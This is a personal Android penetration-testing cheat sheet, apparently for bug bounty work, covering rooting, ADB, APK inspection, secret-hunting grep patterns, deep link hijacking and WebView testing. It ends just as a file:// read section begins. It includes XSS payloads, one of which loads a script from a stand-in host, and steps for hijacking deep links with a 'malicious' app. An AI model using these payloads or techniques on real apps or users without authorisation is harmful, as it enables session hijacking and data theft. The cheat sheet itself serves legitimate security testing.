# Android Penetration Testing Cheat Sheet

This is more of a checklist for myself. May contain useful tips and tricks. **Still need to add a lot of things.**

Everything was tested on Kali Linux v2024.2 (64-bit), Samsung A5 (2017) with Android OS v8.0 (Oreo), and Samsung Galaxy Note S20 Ultra with Android OS v13.0 (Tiramisu) and Magisk root v29.0.

For help with any of the tools type `<tool_name> [-h | -hh | --help]` or `man <tool_name>`.

If you didn't already, read [OWAS MASTG](https://mas.owasp.org/MASTG/) \([GitHub](https://github.com/OWASP/owasp-mastg)\) and [OWASP MASVS](https://mas.owasp.org/MASVS/) \([GitHub](https://github.com/OWASP/owasp-masvs)\). You can download OWASP MASTG checklist from [here](https://github.com/OWASP/owasp-mastg/releases).

I also recommend reading [HackTricks - Android Applications Pentesting](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting).

__In most cases, to be eligible for a bug bounty reward, you need to exploit a vulnerability without root privileges, potentially by creating your own proof-of-concept (PoC) app with malicious behavior.__

Find out more about my "malicious" PoC app in my project at [ivan-sincek/malware-apk](https://github.com/ivan-sincek/malware-apk).

Websites that you should use while writing the report:

* [cwe.mitre.org/data](https://cwe.mitre.org/data)
* [owasp.org/projects](https://owasp.org/projects)
* [owasp.org/www-project-mobile-top-10](https://owasp.org/www-project-mobile-top-10)
* [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/Glossary.html)
* [first.org/cvss/calculator/4.0](https://www.first.org/cvss/calculator/4.0)
* [bugcrowd.com/vulnerability-rating-taxonomy](https://bugcrowd.com/vulnerability-rating-taxonomy)
* [nvd.nist.gov/ncp/repository](https://nvd.nist.gov/ncp/repository)
* [attack.mitre.org](https://attack.mitre.org)

My other cheat sheets:

* [iOS Testing Cheat Sheet](https://github.com/ivan-sincek/ios-penetration-testing-cheat-sheet)
* [Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)
* [WiFi Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet)

Future plans:

* modify `networkSecurityConfig` to add custom root CA certificates,
* test widgets, push notifications, and Firebase,
* SMALI code injection,
* Flutter attacks,
* create more Frida scripts.

## Table of Contents

**-1. [Rooting](#-1-rooting)**

* [Magisk](#magisk)

**0. [Install Tools](#0-install-tools)**

* [Magisk Frida](#magisk-frida)
* [Magisk SQLite 3](#magisk-sqlite-3)
* [WiFi ADB - Debug Over Air](#wifi-adb---debug-over-air)
* [BusyBox](#busybox)
* [Kali Linux Tools](#kali-linux-tools)
* [Java](#java)
* [Apktool](#apktool)
* [Mobile Security Framework (MobSF)](#mobile-security-framework-mobsf)
* [Drozer](#drozer)
* [Install Web Proxy Certificates](#install-web-proxy-certificates)

**1. [Basics](#1-basics)**

* [Android Debug Bridge (ADB)](#android-debug-bridge-adb)
* [Install/Uninstall an APK](#installuninstall-an-apk)
* [Download/Upload Files and Directories](#downloadupload-files-and-directories)
* [Bypassing Permission Denied](#bypassing-permission-denied)

**2. [Inspect an APK](#2-inspect-an-apk)**

* [Pull an APK (base.apk)](#pull-an-apk-baseapk)
* [AndroidManifest.xml](#androidmanifestxml)
* [strings.xml](#stringsxml)

**3. [Search for Files and Directories](#3-search-for-files-and-directories)**

* [SharedPreferences](#sharedpreferences)

**4. [Inspect Files](#4-inspect-files)**

* [Single File](#single-file)
* [Multiple Files](#multiple-files)
* [File Scraper](#file-scraper)
* [SQLite 3](#sqlite-3)
* [Nuclei](#nuclei)
* [Backups](#backups)

**5. [SpotBugs](#5-SpotBugs)**

**6. [Deep Links](#6-deep-links)**

* [Android App Link Verification Tester](#android-app-link-verification-tester)

* [Deep Link Hijacking](#deep-link-hijacking)

**7. [WebViews](#7-webviews)**

**8. [Frida](#8-frida)**

* [Frida Scripts](#frida-scripts)

**9. [Objection](#9-objection)**

* [Bypasses](#bypasses)

**10. [Drozer](#10-drozer)**

* [Activities](#activities)
* [Content Providers](#content-providers)
* [Broadcast Receivers](#broadcast-receivers)
* [Services](#services)

**11. [Intent Injections](#11-intent-injections)**

**12. [Taskjacking](#12-taskjacking)**

**13. [Tapjacking](#13-tapjacking)**

**14. [Decompile an APK](#14-decompile-an-apk)**

**15. [Repackage an APK](#15-repackage-an-apk)**

* [Decode](#decode)
* [Repackage](#repackage)
* [Code Sign](#code-sign)

**16. [Miscellaneous](#16-miscellaneous)**

* [Monitor the System Log](#monitor-the-system-log)
* [Monitor File Changes](#monitor-file-changes)

**17. [Tips and Security Best Practices](#17-tips-and-security-best-practices)**

**18. [Useful Websites and Tools](#18-useful-websites-and-tools)**

**19. [Vulnerable Apps](#19-vulnerable-apps)**

## -1. Rooting

**Rooting an Android device will void its warranty. I have no [liability](https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/LICENSE) over your actions.**

### Magisk

Root your Android device using [Magisk](https://topjohnwu.github.io/Magisk) root.

I only use Samsung devices and follow the [Magisk guide for Samsung devices](https://topjohnwu.github.io/Magisk/install.html#samsung-devices).

Before flashing the firmware on Samsung devices, make sure the bootloader shows the following:

```fundamental
* FRP LOCK: OFF
* OEM LOCK: OFF (U)
* KG STATS: CHECKING
```

To perform a full FRP unlock:

* log out of all your Google accounts,
* log out of your Samsung account.

To perform a full OEM unlock:

* enable OEM unlocking in the developer options,
* then, in the bootloader, long-press the volume up button to enter the screen that allows you to permanently unlock the bootloader.

To ensure Knox Guard (KG) status is set to checking, make sure your Android device is connected to the internet, e.g., via WiFi.

The rest is easy.

## 0. Install Tools

### Magisk Frida

Download [Magisk Frida](https://github.com/ViRb3/magisk-frida/releases), then, open your [Magisk](https://topjohnwu.github.io/Magisk) app and install Frida by importing the downloaded archive.

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/magisk_install_from_storage.jpg" alt="Magisk Frida" height="600em"></p>

<p align="center">Figure 1 - Magisk Frida</p>

### Magisk SQLite 3

Download [Magisk SQLite 3](https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/tree/main/binaries), then, open your [Magisk](https://topjohnwu.github.io/Magisk) app and install SQLite 3 by importing the downloaded archive.

### WiFi ADB - Debug Over Air

Deprecated. Newer Android devices have a wireless debugging feature in developer options.

Install [WiFi ADB - Debug Over Air](https://play.google.com/store/apps/details?id=com.ttxapps.wifiadb). To be used with [ADB](#android-debug-bridge-adb).

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/wifi_adb.jpg" alt="WiFi ADB - Debug Over Air" height="600em"></p>

<p align="center">Figure 2 - WiFi ADB - Debug Over Air</p>

### BusyBox

Additional set of tools for advanced users. Read more at [busybox.net](https://busybox.net/about.html) \([Google Play](https://play.google.com/store/apps/details?id=stericson.busybox)\).

### Kali Linux Tools

Install required tools on your Kali Linux:

```fundamental
apt-get -y install docker.io

systemctl start docker

apt-get -y install adb dex2jar jadx nuclei radare2 sqlite3 sqlitebrowser xmlstarlet apksigner zipalign

pip3 install frida-tools objection file-scraper
```

More information about my tool can be found at [ivan-sincek/file-scraper](https://github.com/ivan-sincek/file-scraper).

Make sure that Frida and Objection are always up to date:

```fundamental
pip3 install --upgrade frida-tools objection
```

### Java

Install:

```fundamental
apt-get -y install default-jdk
```

More Java/JDK versions can be found at [oracle.com/java/technologies/downloads/archive](https://www.oracle.com/java/technologies/downloads/archive).

To switch between multiple Java/JDK versions, run:

```fundamental
update-alternatives --config java

update-alternatives --config javac
```

### Apktool

Download and install:

```bash
apt-get -y install aapt

wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O apktool

chmod +x apktool && cp apktool /usr/local/bin/apktool

wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O apktool.jar

chmod +x apktool.jar && cp apktool.jar /usr/local/bin/apktool.jar
```

### Mobile Security Framework (MobSF)

Install:

```fundamental
docker pull opensecurity/mobile-security-framework-mobsf
```

Run:

```fundamental
docker run -it --rm --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

Navigate to `http://localhost:8000` using your preferred web browser. Username and password are `mobsf:mobsf`.

Sometimes, for some reason, [MobSF](#mobile-security-framework-mobsf) might not want to parse your APK; in that case, try to [decode](#decode) and [repackage](#repackage) your APK, then, upload it again.

Uninstall:

```fundamental
docker image rm opensecurity/mobile-security-framework-mobsf
```

### Drozer

Install:

```fundamental
docker pull fsecurelabs/drozer
```

Run:

```fundamental
docker run -it --rm --name drozer fsecurelabs/drozer
```

Download [Drozer Agent](https://github.com/WithSecureLabs/drozer-agent/releases) and install it either manually or by using [ADB](#android-debug-bridge-adb).

Uninstall:

```fundamental
docker image rm fsecurelabs/drozer
```

## Install Web Proxy Certificates

Open [Burp Suite](https://portswigger.net/burp/communitydownload), navigate to `Proxy --> Proxy Settings` and save the certificate, e.g., as `burp_suite_root_ca.der`.

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/exporting_burp_suite_proxy_certificate.png" alt="Exporting Burp Suite Proxy Certificate"></p>

<p align="center">Figure 3 - Exporting Burp Suite Proxy Certificate</p>

Open [ZAP](https://www.zaproxy.org), navigate to `Tools --> Options --> Network --> Server Certificates`, and save the certificate, e.g., as `zap_root_ca.cer`.

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/exporting_zap_certificate.png" alt="Exporting ZAP Certificate"></p>

<p align="center">Figure 4 - Exporting ZAP Certificate</p>

Now, you can either transfer the files to your Android device manually or run:

```fundamental
adb push burp_suite_root_ca.der /storage/emulated/0/
adb push zap_root_ca.cer /storage/emulated/0/
```

`/storage/emulated/0/` is the internal storage path that can be accessed through the UI, e.g., on your Android device, navigate to `My Files --> Internal Storage`.

To install, simply tap on the certificates and follow the on-screen instructions.

## 1. Basics

### Android Debug Bridge (ADB)

Start the server:

```fundamental
adb start-server
```

Stop the server:

```fundamental
adb kill-server
```

List attached devices:

```fundamental
adb devices
```

On your Android device, in developer options, enable wireless debugging to use ADB over WiFi.

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/wireless_debugging.jpg" alt="Wireless debugging" height="600em"></p>

<p align="center">Figure 5 - Wireless debugging</p>

Connect to a remote device using ADB over WiFi:

```fundamental
adb pair 192.168.1.10:1337

adb connect 192.168.1.10:3301
```

On older Android devices, use [WiFi ADB](#wifi-adb---debug-over-air).

Open a system shell as non-root:

```fundamental
adb shell
```

Open a system shell as root:

```fundamental
adb shell su
```

Show activity manager's full usage:

```fundamental
adb shell am -h
```

### Install/Uninstall an APK

Install an APK (specify `-s` to install the APK to a removable storage):

```fundamental
adb install someapp.apk

adb install -s someapp.apk
```

Uninstall an APK (specify `-k` to keep the data and cache directories):

```fundamental
adb uninstall com.someapp.dev

adb uninstall -k com.someapp.dev
```

### Download/Upload Files and Directories

Some of the internal storage paths:

```fundamental
cd /data/local/tmp/

cd /data/data/com.someapp.dev/cache/
cd /data/user/0/com.someapp.dev/cache/

cd /mnt/sdcard/Android/data/com.someapp.dev/cache/
cd /storage/emulated/0/Android/data/com.someapp.dev/cache/

cd /mnt/sdcard/Android/obb/com.someapp.dev/cache/
cd /storage/emulated/0/Android/obb/com.someapp.dev/cache/

cd /mnt/media_rw/3664-6132/Android/data/com.someapp.dev/files/
cd /storage/3664-6132/Android/data/com.someapp.dev/files/
```

Number `0` in both, `/data/user/0/` and `/storage/emulated/0/` paths, represents the first user in a multi-user device.

`/storage/emulated/0/` is the internal storage path that can be accessed through the UI, e.g., on your Android device, navigate to `My Files --> Internal Storage`.

Don't confuse `/mnt/sdcard/` path with a real removable storage path because sometimes such path is device specific, so you will need to search it on the internet or extract it using some Java code. In my case it is `/mnt/media_rw/3664-6132/` path.

```fundamental
XML                     -->  Java Method                                -->  Path

<files-path/>           -->  getContext().getFilesDir()                 -->  /data/user/0/com.someapp.dev/files

<cache-path/>           -->  getContext().getCacheDir()                 -->  /data/user/0/com.someapp.dev/cache

<external-path/>        -->  Environment.getExternalStorageDirectory()  -->  /storage/emulated/0

<external-files-path/>  -->  getContext().getExternalFilesDir("")       -->  /storage/emulated/0/Android/data/com.someapp.dev/files

<external-cache-path/>  -->  getContext().getExternalCacheDir()         -->  /storage/emulated/0/Android/data/com.someapp.dev/cache

<external-media-path/>  -->  getContext().getExternalMediaDirs()        -->  /storage/emulated/0/Android/media/com.someapp.dev
                                                                             /storage/3664-6132/Android/media/com.someapp.dev
																   
-                       -->  getContext().getExternalFilesDirs("")      -->  /storage/emulated/0/Android/data/com.someapp.dev/files
                                                                             /storage/3664-6132/Android/data/com.someapp.dev/files
```

---

Tilde `~` is short for the root directory.

Download a file or directory from your Android device:

```fundamental
adb pull ~/somefile.txt ./

adb pull ~/somedir ./
```

Keep in mind that not all directories have the write and/or execute permission; regardless, you can always upload files to and execute from `/data/local/tmp/` directory.

Upload a file or directory to your Android device:

```fundamental
adb push somefile.txt /data/local/tmp/

adb push somedir /data/local/tmp/
```

Empty directories will not be uploaded.

### Bypassing Permission Denied

Download a file from your Android device:

```bash
adb shell su -c 'cat ~/somefile.txt' > somefile.txt

adb shell su -c 'run-as com.someapp.dev cat ~/somefile.txt' > somefile.txt
```

Download a directory from your Android device:

```bash
dir="somedir"; IFS=$'\n'; for subdir in $(adb shell su -c "find \"${dir}\" -type d"); do mkdir -p ".${subdir}"; done; for file in $(adb shell su -c "find \"${dir}\" -type f"); do adb shell su -c "cat \"${file// /\\\ }\"" > ".${file}"; done;
```

Upload a file or directory to your Android device:

```bash
src="somefile.txt"; dst="/data/data/com.someapp.dev/"; tmp="/data/local/tmp/"; base=$(basename "${src}"); adb push "${src}" "${tmp}"; adb shell su -c "cp -r \"${tmp}${base}\" \"${dst}\" && rm -rf \"${tmp}${base}\""
```

## 2. Inspect an APK

### Pull an APK (base.apk)

```bash
adb shell pm list packages 'keyword' | cut -d ':' -f2

adb pull $(adb shell pm path com.someapp.dev | cut -d ':' -f2 | grep 'base.apk') ./
```

Pull an APK by specific keyword (one-liner):

```bash
keyword="keyword"; pkg=$(adb shell pm list packages "${keyword}" | head -n 1 | cut -d ':' -f2); adb pull $(adb shell pm path "${pkg}" | cut -d ':' -f2 | grep 'base.apk') ./
```

Decode an APK using [Apktool](#decode). You should now see the `decoded` directory.

## AndroidManifest.xml

Always inspect `decoded/AndroidManifest.xml` content for possible misconfigurations.

Things to look for in AndroidManifest.xml:

* `minSdkVersion`, `targetSDKVersion`, and `maxSdkVersion` - app should not support outdated and vulnerable Android releases,
* `debuggable="true"` - production app (i.e., build) should not be debuggable,
* `android:allowBackup="true"` - app should not [backup](#backups) any sensitive data,
* `usesCleartextTraffic="true"` - app should not use a cleartext HTTP communication,
* `networkSecurityConfig` - inspect network security configurations for SSL/TLS pinnings, whitelisted domains, and `cleartextTrafficPermitted="true"` inside `decoded/res/xml/` directory,
* `permission` - look for unused \[custom\] permissions, and permissions with weak [protection](https://developer.android.com/guide/topics/manifest/permission-element) (`protectionLevel`),
* `exported="true"` - [enumerate](#10-drozer) exported activities, content providers, broadcast receivers, and services,
* `taskAffinity` - activities missing this attribute might be vulnerable to [taskjacking](#taskjacking),
* `android:autoVerify="true"` - deep links missing this attribute might be vulnerable to [deep link hijacking](#deep-link-hijacking),
* etc.

---

Extract URL schemes from AndroidManifest.xml:

```bash
xmlstarlet sel -t -m '//activity/intent-filter/data[@android:scheme]' -v '@android:scheme' -n AndroidManifest.xml | sort -uf | tee url_schemes.txt
```

Extract URL schemes and corresponding hosts from AndroidManifest.xml:

```bash
xmlstarlet sel -t -m '//activity/intent-filter/data[@android:scheme and @android:host]' -v 'concat(@android:scheme, "://", @android:host, @android:pathPrefix, @android:path, @android:pathSufix)' -n AndroidManifest.xml  | sort -uf | tee url_schemes_hosts.txt
```

Resolve all `@string` keys from AndroidManifest.xml as `key: value` pairs:

```bash
dir="./"; for key in $(grep -Poi '(?<="\@string\/).+?(?=\")' "${dir}/AndroidManifest.xml" | sort -u); do val=$(xmlstarlet sel -t -v "/resources/string[@name='${key}']" "${dir}/res/values/strings.xml"); echo "${key}: ${val}"; done
```

## strings.xml

Always inspect `decoded/res/values/strings.xml` for endpoints, sensitive data \[in Base64 encoding\], etc. For more examples, see section [4. Inspect Files](#4-inspect-files).

## 3. Search for Files and Directories

Search for files and directories from the root directory:

```bash
find / -iname '*keyword*'
```

Search for files and directories in the app specific directories (run `env` in [Objection](#9-objection)):

```bash
cd /data/user/0/com.someapp.dev/

cd /storage/emulated/0/Android/data/com.someapp.dev/

cd /storage/emulated/0/Android/obb/com.someapp.dev/
```

If you want to download a whole directory from your Android device, see section [Download/Upload Files and Directories](#downloadupload-files-and-directories).

I preffer downloading the app specific directories, and then doing the [file inspection](#4-inspect-files) on my Kali Linux.

Search for files and directories from the current directory:

```bash
find . -iname '*keyword*'

for keyword in 'access' 'account' 'admin' 'card' 'cer' 'conf' 'cred' 'customer' 'email' 'history' 'info' 'json' 'jwt' 'key' 'kyc' 'log' 'otp' 'pass' 'pem' 'pin' 'plist' 'priv' 'refresh' 'salt' 'secret' 'seed' 'setting' 'sign' 'sql' 'token' 'transaction' 'transfer' 'tar' 'txt' 'user' 'zip' 'xml'; do find . -iname "*${keyword}*"; done
```

### SharedPreferences

Search for files and directories in [SharedPreferences](https://developer.android.com/reference/android/content/SharedPreferences) insecure storage directory:

```bash
cd /data/user/0/com.someapp.dev/shared_prefs/
```

The files should not be world-readable (e.g., `-rw-rw-r--` is not good, and `-rw-rw----` is good):

```bash
ls /data/user/0/com.someapp.dev/shared_prefs/ -al
```

If the production build is [debuggable](https://developer.android.com/topic/security/risks/android-debuggable), it is possible to get the read access rights to the app specific directories as a low-privileged user by leveraging `run-as` command.

Download a file from SharedPreferences as non-root:

```bash
adb exec-out run-as com.someapp.dev cat /data/user/0/com.someapp.dev/shared_prefs/somefile.xml > somefile.xml
```

SharedPreferences is unencrypted and backed up by default, and as such, should not contain any sensitive data after user logs out - it should be cleared by calling [SharedPreferences.Editor.clear\(\)](https://developer.android.com/reference/android/content/SharedPreferences.Editor#clear()). It should also be excluded from backups by specifying [dataExtractionRules](https://developer.android.com/guide/topics/data/autobackup#include-exclude-android-12) inside app's AndroidManifest.xml.

## 4. Inspect Files

Inspect memory dumps, binaries, files inside [a decompiled APK](#14-decompile-an-apk), files inside the app specific directories, or any other files.

After you finish testing \[and logout\], don't forget to [download](#downloadupload-files-and-directories) the app specific directories and inspect all the files inside. Inspect what is new and what still persists after the logout.

There will be some false positive results since the regular expressions are not perfect. I prefer to use `rabin2` over `strings` because it can read Unicode characters.

On your Android device, try to modify app's files to test the filesystem checksum validation, i.e., to test the file integrity validation.

### Single File

Search for hardcoded sensitive data:

```bash
rabin2 -zzzqq somefile | grep -Pi '[^\w\d\n]+(?:basic|bearer)\ .+'

rabin2 -zzzqq somefile | grep -Pi '(?:access|account|admin|basic|bearer|card|conf|cred|customer|email|history|id|info|jwt|key|kyc|log|otp|pass|pin|priv|refresh|salt|secret|seed|setting|sign|token|transaction|transfer|user)[\w\d]*(?:\"\ *\:|\ *\=).+'

rabin2 -zzzqq somefile | grep -Pi '[^\w\d\n]+(?:bug|comment|fix|issue|note|problem|to(?:\_|\ |)do|work)[^\w\d\n]+.+'
```

Extract URLs, deep links, IPs, etc.:

```bash
rabin2 -zzzqq somefile | grep -Po '\w+\:\/\/[\w\-\.\@\:\/\?\=\%\&\#]+' | sort -uf | tee urls.txt

rabin2 -zzzqq somefile | grep -Po '(?:\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}' | sort -uf | tee ips.txt
```

Extract all strings and decode Base64 strings:

```bash
rabin2 -zzzqq somefile | sort -uf > strings.txt

grep -Po '(?:[a-zA-Z0-9\+\/]{4})*(?:[a-zA-Z0-9\+\/]{4}|[a-zA-Z0-9\+\/]{3}\=|[a-zA-Z0-9\+\/]{2}\=\=)' strings.txt | sort -uf > base64.txt

for string in $(cat base64.txt); do res=$(echo "${string}" | base64 -d 2>/dev/null | grep -PI '[\s\S]+'); if [[ ! -z $res ]]; then echo -n "${string}\n${res}\n\n"; fi; done | tee base64_decoded.txt
```

### Multiple Files

Search for hardcoded sensitive data:

```bash
IFS=$'\n'; for file in $(find . -type f); do echo -n "\nFILE: \"${file}\"\n"; rabin2 -zzzqq "${file}" 2>/dev/null | grep -Pi '[^\w\d\n]+(?:basic|bearer)\ .+'; done

IFS=$'\n'; for file in $(find . -type f); do echo -n "\nFILE: \"${file}\"\n"; rabin2 -zzzqq "${file}" 2>/dev/null | grep -Pi '(?:access|account|admin|basic|bearer|card|conf|cred|customer|email|history|id|info|jwt|key|kyc|log|otp|pass|pin|priv|refresh|salt|secret|seed|setting|sign|token|transaction|transfer|user)[\w\d]*(?:\"\ *\:|\ *\=).+'; done

IFS=$'\n'; for file in $(find . -type f); do echo -n "\nFILE: \"${file}\"\n"; rabin2 -zzzqq "${file}" 2>/dev/null | grep -Pi '[^\w\d\n]+(?:bug|comment|fix|issue|note|problem|to(?:\_|\ |)do|work)[^\w\d\n]+.+'; done
```

Extract URLs, deep links, IPs, etc.:

```bash
IFS=$'\n'; for file in $(find . -type f); do rabin2 -zzzqq "${file}" 2>/dev/null; done | grep -Po '\w+\:\/\/[\w\-\.\@\:\/\?\=\%\&\#]+' | grep -Piv '\.(css|gif|jpeg|jpg|ogg|otf|png|svg|ttf|woff|woff2)' | sort -uf | tee urls.txt

IFS=$'\n'; for file in $(find . -type f); do rabin2 -zzzqq "${file}" 2>/dev/null; done | grep -Po '(?:\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}' | sort -uf | tee ips.txt
```

Extract all strings and decode Base64 strings:

```bash
IFS=$'\n'; for file in $(find . -type f); do rabin2 -zzzqq "${file}" 2>/dev/null; done | sort -uf > strings.txt

grep -Po '(?:[a-zA-Z0-9\+\/]{4})*(?:[a-zA-Z0-9\+\/]{4}|[a-zA-Z0-9\+\/]{3}\=|[a-zA-Z0-9\+\/]{2}\=\=)' strings.txt | sort -uf > base64.txt

for string in $(cat base64.txt); do res=$(echo "${string}" | base64 -d 2>/dev/null | grep -PI '[\s\S]+'); if [[ ! -z $res ]]; then echo -n "${string}\n${res}\n\n"; fi; done | tee base64_decoded.txt
```

### File Scraper

Automate all of the above file inspection (and more) with a single tool, also using multithreading.

```bash
apt-get -y install radare2

pip3 install file-scraper
```
  
```fundamental
file-scraper -dir source -o file_scraper_results.html -e default
```

More about my other project at [ivan-sincek/file-scraper](https://github.com/ivan-sincek/file-scraper).

### SQLite 3

Use [ADB](#downloadupload-files-and-directories) to download database files, and then open them using [DB Browser for SQLite](https://sqlitebrowser.org).

To inspect the content, navigate to `Browse Data` tab, expand `Table` dropdown menu, and select the desired table.

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/sqlite.png" alt="SQLite"></p>

<p align="center">Figure 6 - DB Browser for SQLite</p>

To inspect and/or edit database files on your Android device directly, use [SQLite 3](#magisk-sqlite-3); [ADB](#android-debug-bridge-adb) to your Android device and run the following commands:

```sql
sqlite3 somefile

.dump

.tables

SELECT * FROM sometable;

.quit
```

### Nuclei

Download mobile Nuclei templates:

```fundamental
git clone https://github.com/optiv/mobile-nuclei-templates ~/mobile-nuclei-templates
```

Decode an APK using [Apktool](#decode).

Search for hardcoded sensitive data:

```bash
echo decoded | nuclei -t ~/mobile-nuclei-templates/Keys/ -o nuclei_keys_results.txt

cat nuclei_keys_results.txt | grep -Po '(?<=\]\ ).+' | sort -uf > nuclei_keys_results_sorted.txt

echo decoded | nuclei -t ~/mobile-nuclei-templates/Android/ -o nuclei_android_results.txt

cat nuclei_android_results.txt | grep -Po '(?<=\]\ ).+' | sort -uf > nuclei_android_results_sorted.txt
```

### Backups

Create a backup of the whole Android device:

```fundamental
adb backup -system -apk -shared -all -f backup.ab
```

Create a backup of a specific app:

```
adb backup -nosystem -noapk -noshared -f backup.ab com.someapp.dev
```

App should not backup any sensitive data.

Restore from a backup:

```fundamental
adb restore backup.ab
```

--

Download the latest [Android Backup Extrator](https://github.com/nelenkov/android-backup-extractor/releases), and repackage a backup to a browsable archive (TAR):

```fundamental
java -jar abe.jar unpack backup.ab backup.tar
```

You can try to tamper with a browsable archive (TAR) and repackage it back to a restorable format:

```fundamental
java -jar abe.jar pack backup.tar backup.ab
```

## 5. SpotBugs

SAST tool for identifying security vulnerabilities inside an APK, technically, inside a JAR.

\[1\] Convert an APK to a JAR:

```
d2j-dex2jar base.apk -o base.jar
```

\[2\] Decompile the JAR using [jadx](#14-decompile-an-apk). You should now see the `source_jar` directory.

\[3\] Download the latest version of the tool from [GitHub](https://github.com/spotbugs/spotbugs/releases), unpack the archive, and open your preferred console from the `/lib/` directory.

Run with GUI:

```fundamental
java -jar spotbugs.jar -gui
```

<p align="center"><img src="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet/blob/main/img/spotbugs.jpg" alt="SpotBugs"></p>

<p align="center">Figure 7 - SpotBugs</p>

Run without the GUI:

```fundamental
java -jar spotbugs.jar -textui -progress -sourcepath /root/Desktop/source_jar/sources -html=/root/Desktop/spotbugs_results.html /root/Desktop/base.jar
```

More about the tool at [spotbugs/spotbugs](https://github.com/spotbugs/spotbugs).

## 6. Deep Links

Test [/.well-known/assetlinks.json](https://developer.android.com/training/app-links/verify-android-applinks) using [developers.google.com/digital-asset-links/tools/generator](https://developers.google.com/digital-asset-links/tools/generator).

Deep links can somtimes bypass authentication, including biometrics.

Don't forget to test a deep link for a cross-site scripting (XSS), open redirect, etc., in case it is opening a WebView.

---

Create an HTML template to manually test deep links (see also ##):

```bash
mkdir android_deep_links

# multiple URL schemes

for scheme in $(cat url_schemes.txt); do for url in $(cat urls.txt | grep -Poi "${scheme}\:\/\/.+"); do if [[ ! -z $url ]]; then echo -n "<a href='${url}'>${url}</a>\n<br><br>\n" | tee -a "android_deep_links/${scheme}_deep_links.html"; fi; done; done

# single URL scheme

scheme="somescheme"; for string in $(cat urls.txt | grep -Poi "${scheme}\:\/\/.+"); do echo -n "<a href='${string}'>${string}</a>\n<br><br>\n"; done | tee -a "android_deep_links/${scheme}_deep_links.html"

python3 -m http.server 9000 --directory android_deep_links
```

For `url_schemes.txt` see section [AndroidManifest.xml](#androidmanifestxml), and for `urls.txt` see section [4. Inspect Files](#4-inspect-files).

---

Open a deep link using ADB:

```
adb shell am start -W -a android.intent.action.VIEW -d 'somescheme://com.someapp.dev/somepath?somekey=somevalue'
```

If you see a pop-up showing multiple apps to open the same deep link, it is very likely that this deep link could be hijacked.

### Android App Link Verification Tester

Install:

```bash
git clone https://github.com/inesmartins/Android-App-Link-Verification-Tester && cd Android-App-Link-Verification-Tester

pip3 install -r requirements.txt
```

Decode an APK using [Apktool](#decode). You should now see the `decoded` directory.

Get deep links:

```fundamental
python3 deeplink_analyser.py -op list-applinks -m decoded/AndroidManifest.xml -s decoded/res/values/strings.xml
```

Build PoC:

```fundamental
python3 deeplink_analyser.py -op build-poc -m decoded/AndroidManifest.xml -s decoded/res/values/strings.xml
```

Verify app links (valid app links have `http[s]` scheme):

```fundamental
python3 deeplink_analyser.py -op verify-applinks -apk base.apk -p com.someapp.dev
```

### Deep Link Hijacking

Hijacking a deep link after a successful login on a website can easly lead to session hijacking.

**Properly implemented app links cannot be hijacked.**

To hijack a deep link, specify it in [AndroidManifest.xml](https://github.com/ivan-sincek/malware-apk/blob/main/src/Malware/app/src/main/AndroidManifest.xml#L49) inside a "malicious" PoC app:

```xml
<data
    android:scheme="somescheme"
    android:host="somehost"
/>
```

Increasing the [priority](https://github.com/ivan-sincek/malware-apk/blob/main/src/Malware/app/src/main/AndroidManifest.xml#L45) might also increase your chances of hijacking a deep link:

```xml
<intent-filter android:priority="999">
```

After that, you will need to find a way to trigger your target deep link.

Find out how to perform deep link hijacking using a "malicious" PoC app in my project at [ivan-sincek/malware-apk](https://github.com/ivan-sincek/malware-apk#implicit-intent).

## 7. WebViews

Unless there is an explicit need, WebView URLs should not be user-controlled, e.g., through intents.

WebViews can easily lead to cross-site scripting (XSS), arbitrary file read/write, data leakage and exfiltration, remote code execute (RCE), etc.

Things to look for in the source code:
* [WebView](https://developer.android.com/reference/android/webkit/WebView)
* [setJavaScriptEnabled](https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled\(boolean\))
    * default: `false`
* [setAllowFileAccess](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\))
    * default: `false` on Android OS v11.0+ and API v30+
* [setAllowUniversalAccessFromFileURLs](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\))
    * default: `false` on Android OS v4.1+ and API v16+
* [setAllowFileAccessFromFileURLs](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\))
    * default: `false` on Android OS v4.1+ and API v16+
    * value is ignored if `getAllowUniversalAccessFromFileURLs` is `true`
* [addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface\(java.lang.Object,%20java.lang.String\))
    * default: only public methods annotated with `@JavascriptInterface` on Android OS v4.2+ and API v17+ can be added; otherwise, all public methods (including inherited ones) can be added
* [loadUrl](https://developer.android.com/reference/android/webkit/WebView#loadUrl\(java.lang.String\))

Simple cross-site scripting (XSS) payloads:

```html
javascript:alert(1)

<script>alert(1)</script>

<script>alert(someJavaScriptBridge.someMethod())</script>

<script src="https://myserver.com/xss.js"></script>

<img src="https://github.com/favicon.ico" onload="alert(1)">
```

Arbitrary file read using the `file://` URL scheme:

